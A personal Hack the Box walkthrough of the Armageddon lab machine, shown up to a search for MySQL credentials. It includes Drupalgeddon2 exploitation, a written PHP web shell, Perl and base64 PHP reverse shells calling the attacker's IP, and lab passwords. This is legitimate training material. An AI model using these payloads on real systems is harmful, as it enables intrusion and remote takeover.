---
layout: post
layout: default
title: "Armageddon"
description: "My writeup for the HacktheBox Armageddon machine. An easy box that used a Drupal exploit followed by Dirty Sock, an exploit of snap running as root."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Hack the Box - Armageddon

# Contents
- [Overview](#overview)
  - [Ratings](#ratings)
- [Loot](#loot)
- [Enumeration](#enumeration)
  - [Autorecon](#autorecon)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
- [Website](#website)
  - [Login Form](#login-form)
  - [Drupal Directory Listing](#drupal-directory-listing)
- [Shell as Apache](#shell-as-apache)
  - [Drupalgeddon](#drupalgeddon)
  - [Enumeration](#enumeration-1)
    - [/etc/passwd](#/etc/passwd)
    - [Process Enumeration](#process-enumeration)
    - [mysql](#mysql)
    - [Linpeas](#linpeas)
      - [Linpeas Highlights](#linpeas-highlights)
    - [Password Reuse](#password-reuse)
    - [Cracking the Password](#cracking-the-password)
- [SSH as brucetherealadmin](#ssh-as-brucetherealadmin)
  - [Enumeration](#enumeration-2)
  - [Dirty Sock Exploit](#dirty-sock-exploit)
  - [Customising the Exploit](#customising-the-exploit)
  - [Repurposing the Dirty Sock Payload](#repurposing-the-dirty-sock-payload)
    - [Automation](#automation)

# Overview

This box involved exploiting a CVE in Drupal, a CMS, on a Wordpress site. From there you could get a (very temperamental) shell, and find a MySQL password in a config file. This lets us dump hashes from the database and switch to the `bruceistherealadmin` user, who can run `snap install` as root. This leads us to the 'Dirty Sock' snap exploit, which gives us a shell as a new user with root-equivalent permissions.

The initial exploit for the box wasn't difficult to find, and the first privesc was just a case of finding the right config file. But I really enjoyed the privesc to root - reading up on how the CVE works was extremely interesting, and getting it to work was challenging enough without being frustrating.

## Ratings

I rated user a 3 difficulty, as it took me a lot of fumbling around and there were some frustrating aspects of the foothold shell interactivity that made things hard, but the steps were overall very simple.

I rated root a 3 also, as it wasn't too hard to identify and recreate the exploit. It wasn't as simple as just running dirty sock, but it was very easy to take their payload and reuse it. Creating your own snap was an extra layer of difficulty, but not necessary for the root.

**Matrix:**

![](/assets/images/blogs/Pasted image 20210405152937.png)

You'd like to think this isn't very real life-applicable, as many of the CVEs are quite old; however, we know that people don't patch their stuff...

# Loot

|User|Password|Service|
|---|---|---|
|drupaluser|CQHEy@9M\*m23gBVj|MySQL|
|brucetherealadmin|booboo|Drupal Login/Linux User|

# Enumeration

## Autorecon

I started off with an `autorecon` scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ autorecon 10.10.10.233
[*] Scanning target 10.10.10.233
[*] Running service detection nmap-full-tcp on 10.10.10.233
[*] Running service detection nmap-top-20-udp on 10.10.10.233
[*] Running service detection nmap-quick on 10.10.10.233
[!] Service detection nmap-top-20-udp on 10.10.10.233 returned non-zero exit code: 1
[*] Service detection nmap-quick on 10.10.10.233 finished successfully in 42 seconds
[*] Found ssh on tcp/22 on target 10.10.10.233
[*] Found http on tcp/80 on target 10.10.10.233
[*] Running task tcp/22/sslscan on 10.10.10.233
[*] Running task tcp/22/nmap-ssh on 10.10.10.233
[*] Running task tcp/80/sslscan on 10.10.10.233
[*] Running task tcp/80/nmap-http on 10.10.10.233
[*] Running task tcp/80/curl-index on 10.10.10.233
[*] Running task tcp/80/curl-robots on 10.10.10.233
[*] Running task tcp/80/wkhtmltoimage on 10.10.10.233
[*] Running task tcp/80/whatweb on 10.10.10.233
[*] Running task tcp/80/nikto on 10.10.10.233
[*] Task tcp/22/sslscan on 10.10.10.233 finished successfully in less than a second
[*] Task tcp/80/sslscan on 10.10.10.233 finished successfully in less than a second
[*] Running task tcp/80/gobuster on 10.10.10.233
[*] Task tcp/80/curl-robots on 10.10.10.233 finished successfully in 1 second
[*] Task tcp/80/curl-index on 10.10.10.233 finished successfully in 2 seconds
[!] Task tcp/80/gobuster on 10.10.10.233 returned non-zero exit code: 1
[*] [10:12:57] - There are 6 tasks still running on 10.10.10.233
[*] Task tcp/22/nmap-ssh on 10.10.10.233 finished successfully in 19 seconds
[*] Task tcp/80/wkhtmltoimage on 10.10.10.233 finished successfully in 30 seconds
[*] Task tcp/80/whatweb on 10.10.10.233 finished successfully in 51 seconds
[*] [10:13:58] - There are 3 tasks still running on 10.10.10.233
[*] Task tcp/80/nmap-http on 10.10.10.233 finished successfully in 1 minute, 26 seconds
[*] [10:14:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:15:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:16:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:17:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:18:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:19:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:20:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:21:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:22:58] - There are 2 tasks still running on 10.10.10.233
[*] [10:23:58] - There are 2 tasks still running on 10.10.10.233
[*] Service detection nmap-full-tcp on 10.10.10.233 finished successfully in 12 minutes, 25 seconds
[*] [10:24:58] - There is 1 task still running on 10.10.10.233
[*] [10:25:58] - There is 1 task still running on 10.10.10.233
[*] [10:26:58] - There is 1 task still running on 10.10.10.233
[*] [10:27:58] - There is 1 task still running on 10.10.10.233
[*] [10:28:58] - There is 1 task still running on 10.10.10.233
[*] [10:29:58] - There is 1 task still running on 10.10.10.233
[*] [10:30:58] - There is 1 task still running on 10.10.10.233
[*] [10:31:58] - There is 1 task still running on 10.10.10.233
[*] [10:32:58] - There is 1 task still running on 10.10.10.233
[*] [10:33:58] - There is 1 task still running on 10.10.10.233
[*] Task tcp/80/nikto on 10.10.10.233 finished successfully in 21 minutes, 50 seconds
[*] Finished scanning target 10.10.10.233 in 22 minutes, 32 seconds
[*] Finished scanning all targets in 22 minutes, 38 seconds!
```

A couple of the scans failed (annoyingly, one of them was Gobuster) but we can re-run them manually.

It pretty quickly found a website and SSH. Let's review the results from the `nmap` scan.

## Nmap

The UDP scan failed, but the regular scan worked.

I picked up a tip [on reddit](https://www.reddit.com/r/oscp/comments/k7x4o1/just_passed_oscpmy_journey_and_tips/) to start a web server in the autorecon `results` directory, to be able to easily view the scan outputs in a browser. To do so, run the following commands:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ cd results/10.10.10.233/
┌──(mac㉿kali)-[~/Documents/HTB/armageddon/results/10.10.10.233]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

You can then visit `http://localhost:8000/scans/_quick_tcp_nmap.txt` to see the quick nmap scan:

```
# Nmap 7.91 scan initiated Tue Mar 30 10:11:58 2021 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/mac/Documents/HTB/armageddon/results/10.10.10.233/scans/_quick_tcp_nmap.txt -oX /home/mac/Documents/HTB/armageddon/results/10.10.10.233/scans/xml/_quick_tcp_nmap.xml 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up, received user-set (0.13s latency).
Scanned at 2021-03-30 10:12:03 BST for 35s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC2xdFP3J4cpINVArODYtbhv+uQNECQHDkzTeWL+4aLgKcJuIoA8dQdVuP2UaLUJ0XtbyuabPEBzJl3IHg3vztFZ8UEcS94KuWP09ghv6fhc7JbFYONVJTYLiEPD8nrS/V2EPEQJ2ubNXcZAR76X9SZqt11JTyQH/s6tPH+m3m/84NUU8PNb/dyhrFpCUmZzzJQ1zCDStLXJnCAOE7EfW2wNm1CBPCXn1wNvO3SKwokCm4GoMKHSM9rNb9FjGLIY0nq+8mt7RTJZ+WLdHsje3AkBk1yooGFF+0TdOj42YK2OtAKDQBWnBm1nqLQsmm/Va9T2bPYLLK5aUd4/578u7h
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE4kP4gQ5Th3eu3vz/kPWwlUCm+6BSM6M3Y43IuYVo3ppmJG+wKiabo/gVYLOwzG7js497Vr7eGIgsjUtbIGUrY=
|   256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9ZlC3EA13xZbzvvdjZRWhnu9clFOUe7irG8kT0oR4A
80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 30 10:12:38 2021 -- 1 IP address (1 host up) scanned in 40.68 seconds
```

This shows we have port 22 and 80 open, suggesting SSH and a webserver.

It's good practice to come back to the full nmap scan (`http://localhost:8000/scans/_full_tcp_nmap.txt`) once it's finished, although it usually takes a little longer. In this case, it didn't find anything that wasn't found in the quick scan.

The scan reveals a number of interesting entries in `/robots.txt`, including `xmlrpc.php` which stands out immediately - this is a vulnerable feature of some Wordpress blogs.

It also reveals Drupal to be running on the server, which is a popular CMS.

## Gobuster

Gobuster failed to run during autorecon, so we can re-run it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon/results/10.10.10.233]
└─$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.233
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/30 10:45:29 Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/.html                (Status: 403) [Size: 207]                                   
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]  
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/] 
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]    
/.htm                 (Status: 403) [Size: 206]                                    
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]   
/.htaccess            (Status: 403) [Size: 211]                                    
/.htc                 (Status: 403) [Size: 206]                                    
/.html_var_DE         (Status: 403) [Size: 214]                                    
/.htpasswd            (Status: 403) [Size: 211]                                    
/.html.               (Status: 403) [Size: 208]                                    
/.html.html           (Status: 403) [Size: 212]                                    
/.htpasswds           (Status: 403) [Size: 212]                                    
/.htm.                (Status: 403) [Size: 207]                                    
/.htmll               (Status: 403) [Size: 208]                                    
/.html.old            (Status: 403) [Size: 211]                                    
/.html.bak            (Status: 403) [Size: 211]                                    
/.ht                  (Status: 403) [Size: 205]                                    
/.htm.htm             (Status: 403) [Size: 210]                                    
/.gitignore           (Status: 200) [Size: 174]                                    
/.hta                 (Status: 403) [Size: 206]                                    
/.htgroup             (Status: 403) [Size: 210]                                    
/.html1               (Status: 403) [Size: 208]                                    
/.html.LCK            (Status: 403) [Size: 211]                                    
/.html.printable      (Status: 403) [Size: 217]                                    
/.htm.LCK             (Status: 403) [Size: 210]                                    
/.htaccess.bak        (Status: 403) [Size: 215]                                    
/.html.php            (Status: 403) [Size: 211]                                    
/.htx                 (Status: 403) [Size: 206]                                    
/.htmls               (Status: 403) [Size: 208]                                    
/.htm2                (Status: 403) [Size: 207]                                    
/.htlm                (Status: 403) [Size: 207]                                    
/.htuser              (Status: 403) [Size: 209]                                    
/.html-               (Status: 403) [Size: 208]                                    
                                                                                   
===============================================================
2021/03/30 10:53:15 Finished
===============================================================
```

It found a few Wordpress-related directories, but nothing that immediately stands out.

# Website

## Login Form

Visiting the homepage presents us with a login screen:

![](/assets/images/blogs/Pasted image 20210330103246.png)

There is a 'powered by' string in the footer, but no obvious version number. The software listed is `Arnageddon`, a slight variation on spelling that is easy to miss. On previous boxes like Doctor this one letter off has been relevant, but after a quick check on searchsploit to see if there are any documented vulnerabilities it seems it was just a misspelling:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ searchsploit arnageddon
Exploits: No Results
Shellcodes: No Results
```

A quick check of the source confirms that Drupal 7 is used:

![](/assets/images/blogs/Pasted image 20210330104241.png)

I'll come back to this, but do some manual poking of the site first.

It seems we can register for an account. Let's do this, passing the request through Burp.

![](/assets/images/blogs/Pasted image 20210330111528.png)

There don't seem to be any useful hidden fields that could be edited to give us extra permissions.

We get this message when we submit. If we had submitted a password when we created the account then I might attempt logging in despite the account needing approval, but it looks like we are stuck for now.

![](/assets/images/blogs/Pasted image 20210330111117.png)

I tried some basic SQL Injections on the login form, submitting `' OR 1=1;--` in the username and password fields. I also tried the polyglot `SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/` from [this article](https://dev.to/didymus/xss-and-sqli-polyglot-payloads-4hb4). However, it did not trigger any errors.

## Drupal Directory Listing

I wasn't sure where to go from here, so started to look at the results from the Gobuster scan.

Being unfamiliar with Drupal, I decided to start with `/profiles` in case it had any details of usernames registered on the platform. This revealed a directory listing:

![](/assets/images/blogs/Pasted image 20210330113044.png)

Lots of these files are from 2017, which suggests the version of Drupal that is running is an old version. Running `searchploit drupal` reveals many results concerning Drupal 7. Let's see if we can use one to get a shell.

# Shell as Apache
Running `searchsploit -x php/webapps/18564.txt` reveals the following exploit for creating an administrator account:

![](/assets/images/blogs/Pasted image 20210330114822.png)

Copying this into a `makeadmin.html` file and modifying the IP address produces the following result:

![](/assets/images/blogs/Pasted image 20210330115547.png)

The necessary page is not present on this server, so the exploit will not work.

## Drupalgeddon

The module `php/remote/44482.rb` seems more appropriate, and is titled 'Drupalgeddon' which suggests a link to the box. Let's try it with metasploit:

```bash
┌──(mac㉿kali)-[~]
└─$ msfconsole

...[snip]...

msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
...[snip]...

   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection

...[snip]...

msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
```

This was one of the simpler metasploit setups I've ever done, and I only had to set `RHOSTS`, `LHOST`, and change the payload (I'm not a fan of meterpreter and am far more comfortable with a standard bash terminal when I can get one):

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
RHOSTS => 10.10.10.233
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.108
LHOST => 10.10.14.108
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.108:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Command shell session 2 opened (10.10.14.108:4444 -> 10.10.10.233:48294) at 2021-04-01 16:05:58 +0100

id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

We've got a shell!

## Enumeration

The first thing I tried was upgrading my shell. The standard Python method did not work, and backgrounding the shell doesn't seem to work within metasploit, so I carried on as I was.

There was little immediately interesting in the landing `/var/www/html` directory, so I did a search for files accessible by users in the `apache` group instead:

```bash
find / -group apache 2>/dev/null

...[omitting /proc and /var/www/html files]...

/usr/sbin/suexec
```

`/usr/sbin/suexec` stood out as an unusual file. Let's see what it is:

```bash
ls -la /usr/sbin/suexec
-r-x--x---. 1 root apache 15368 Nov 16 16:19 /usr/sbin/suexec

file /usr/sbin/suexec
/usr/sbin/suexec: executable, regular file, no read permission
```

I did a bit of playing around with trying to pass it some commands and execute as another user, but it turned out to be just a standard unix binary.

### /etc/passwd

We can view the other users on the box - the only one with a proper shell is `brucetherealadmin`:

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

There's nothing readable in Bruce's home directory, so we'll move on for now.

### Process Enumeration

`ss -lntp`:

```bash
ss -lntp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      0      127.0.0.1:3306                     *:*                  
LISTEN     0      0            *:22                       *:*                  
LISTEN     0      0      127.0.0.1:25                       *:*                  
LISTEN     0      0         [::]:80                    [::]:*                  
LISTEN     0      0         [::]:22                    [::]:*                  
LISTEN     0      0        [::1]:25                    [::]:*   
```

`ps aux`:

```bash
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       969  0.0  0.3 450272 15500 ?        Ss   12:37   0:01 /usr/sbin/httpd -DFOREGROUND
apache    1068  0.0  0.6 463124 24548 ?        S    12:37   0:00 /usr/sbin/httpd -DFOREGROUND
apache    2671  0.0  0.3 265192 13476 ?        S    13:02   0:02 php -r eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE0LjE2MCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
apache    2673  0.0  0.0  11692  1376 ?        S    13:02   0:00 /bin/sh
apache    2731  0.0  0.0  11824  1756 ?        S    13:05   0:00 bash -i
apache    5859  0.5  0.6 463880 25764 ?        S    14:50   0:54 /usr/sbin/httpd -DFOREGROUND
apache   12422  0.0  0.1  35008  4128 ?        S    16:16   0:00 perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.108:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
apache   12910  0.0  0.0  11688  1136 ?        S    16:23   0:00 bash
apache   12913  0.0  0.0  11692  1380 ?        S    16:23   0:00 /usr/bin/bash
apache   14739  0.1  0.6 463780 25416 ?        S    16:51   0:05 /usr/sbin/httpd -DFOREGROUND
apache   14742  0.1  0.6 463268 24864 ?        S    16:51   0:04 /usr/sbin/httpd -DFOREGROUND
apache   15282  0.0  0.6 463788 25524 ?        S    16:55   0:02 /usr/sbin/httpd -DFOREGROUND
apache   15653  0.0  0.6 463044 24604 ?        S    16:58   0:01 /usr/sbin/httpd -DFOREGROUND
apache   15655  0.0  0.6 463040 24676 ?        S    16:58   0:01 /usr/sbin/httpd -DFOREGROUND
apache   15657  0.0  0.6 463524 25140 ?        S    16:58   0:02 /usr/sbin/httpd -DFOREGROUND
apache   15658  0.0  0.6 463780 25284 ?        S    16:58   0:01 /usr/sbin/httpd -DFOREGROUND
apache   15696  0.0  0.6 463780 25504 ?        S    16:59   0:01 /usr/sbin/httpd -DFOREGROUND
apache   17122  0.0  0.6 463532 25560 ?        S    17:18   0:01 /usr/sbin/httpd -DFOREGROUND
apache   17235  0.0  0.6 463668 25432 ?        S    17:20   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17236  0.0  0.6 463048 24512 ?        S    17:20   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17686  0.1  0.6 463012 24624 ?        S    17:24   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17918  0.0  0.6 463524 25080 ?        S    17:26   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17984  0.0  0.6 462564 24224 ?        S    17:27   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17986  0.0  0.2 450408  9548 ?        S    17:27   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17987  0.0  0.6 462564 24136 ?        S    17:27   0:00 /usr/sbin/httpd -DFOREGROUND
apache   18579  0.0  0.2 450408  8700 ?        S    17:35   0:00 /usr/sbin/httpd -DFOREGROUND
apache   18580  0.0  0.2 450408  8944 ?        S    17:35   0:00 /usr/sbin/httpd -DFOREGROUND
apache   18962  0.0  0.0  51732  1704 ?        R    17:38   0:00 ps aux
```

`netstat` yielded similar results. There were no useful-looking processes running as root, but there were two ports listening locally (3306 for MySQL, and port 25 which turned out to be postfix for sending emails).

Postfix turned out not to be exploitable, so let's dig around in home for a MySQL password.

### mysql

I started looking for creds in `/var/www/html`. There is an `INSTALL.mysql.txt` file which describes the mysql setup. At this point I wanted to try some default creds, but my uninteractive shell was failing to launch mysql so tried looking for another exploit to get a better shell.

I ran another searchsploit and tried to look for a PoC that wasn't metasploit based. The Drupal exploit seemed fairly simple, so I was confident that if I couldn't find one I could try and replicate it myself. Luckily, there was a prewritten one that worked:

```bash
$ searchsploit -x php/webapps/44449.py

...[looks good - previous ones had broken PoC code]...
...[check the usage function for how to run it]...

$ searchsploit -m php/webapps/44449.py
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /home/mac/Documents/HTB/armageddon/44449.rb

$ ruby 44449.rb 10.10.10.233
ruby: warning: shebang line ending with \r may cause problems
Traceback (most recent call last):
	2: from 44449.rb:16:in `<main>'
	1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

I had a missing dependency, so I grepped for anything that is required so I could install them all at once:

```bash
$ cat 44449.rb 10.10.10.233 | grep require
```

`highline\require` was the last one in the list, so I ran `gem search highline` to check the name and `sudo gem install highline`, then re-ran the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ruby 44449.rb 10.10.10.233
ruby: warning: shebang line ending with \r may cause problems
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo YKLHNMTR
[+] Result : YKLHNMTR
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

Much better! I can now actually test mysql login credentials:

```bash
armageddon.htb>> mysql -u root -p
Enter password: ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
```

Unfortunately guessing creds didn't work, so I needed to find some.

Unfortunately this shell seems not to be able to handle the `>` character, which makes using the `find` command harder. Instead of redirecting stderr, we can use `find / -group apache | grep -v denied` to filter out errors.

We can check for SUID files, but there is nothing out of the ordinary:

```bash
armageddon.htb>> find / -perm /4000 | grep -v denied
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

I started searching for some default credentials. `drupal:drupal` is apparently the default set for drupal. However, the password prompt seems to immediately error out:

```bash
armageddon.htb>> mysql -u drupal -p 
Enter password: ERROR 1045 (28000): Access denied for user 'drupal'@'localhost' (using password: NO)
```

